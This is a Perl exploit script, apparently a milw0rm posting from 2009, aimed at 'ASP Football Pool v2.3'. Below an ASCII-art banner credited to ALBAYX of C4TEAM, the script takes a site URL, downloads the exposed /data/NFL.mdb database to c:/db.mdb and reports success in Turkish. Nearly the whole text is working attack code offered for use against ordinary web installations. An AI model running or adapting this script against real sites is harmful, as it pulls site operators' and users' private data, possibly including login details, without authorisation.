#!/usr/bin/perl
#
#
#ASP Football Pool v2.3
#
#Script    : ASP Football Pool v2.3
#
#Demo      : http://brainjar.com/AspFootballPool/demo1
#
#Download  : http://www.brainjar.com/AspFootballPool/download/AspFootballPool_2.3.zip
#
#              _.--"""""--._
#            .'             '.
#           /                 \
#          ;       C4TEAM      ;
#          |                   |
#          |                   |
#          ;                   ;                   ByALBAYX
#           \ (`'--,    ,--'`) /
#            \ \  _ )  ( _  / /                 WWW.C4TEAM.ORG
#             ) )(')/  \(')( (
#            (_ `""` /\ `""` _)
#             \`"-, /  \ ,-"`/
#              `\ / `""` \ /`
#               |/\/\/\/\/\|
#               |\        /|
#               ; |/\/\/\| ;
#                \`-`--`-`/
#                 \      /
#                  ',__,'
#
#
#ASP Football Pool v2.3 Remote Database Disclosure Exploit
#
#Exploited ByALBAYX
##########
#


use lwp::UserAgent;

system('cls');
system('title ASP Football Pool v2.3 Database Disclosure Exploit');
system('color 2');
if (!defined($ARGV[0])) {print "[!] Usage : \n    exploit.pl http://site.com\n";exit();}
if ($ARGV[0] =~ /http:\/\// ) { $site = $ARGV[0]."/"; } else { $site = "http://".$ARGV[0]."/"; }
print "\n\n[-] ASP Football Pool v2.3 Database Disclosure Exploit\n";
print "[-]Exploited ByALBAYX \n\n\n";
print "[!] Exploiting $site ....\n";
my $site      = $ARGV[0] ;
my $target    = $site."/data/NFL.mdb" ;
my $useragent = LWP::UserAgent->new();
my $request   = $useragent->get($target,":content_file" => "c:/db.mdb");
if ($request->is_success) {print "[+] $site Kaydedildi! Git= c:/db.mdb";exit();}
else {print "[!] Exploit $site Failed !\n[!] ".$request->status_line."\n";exit();}

# milw0rm.com [2009-06-01]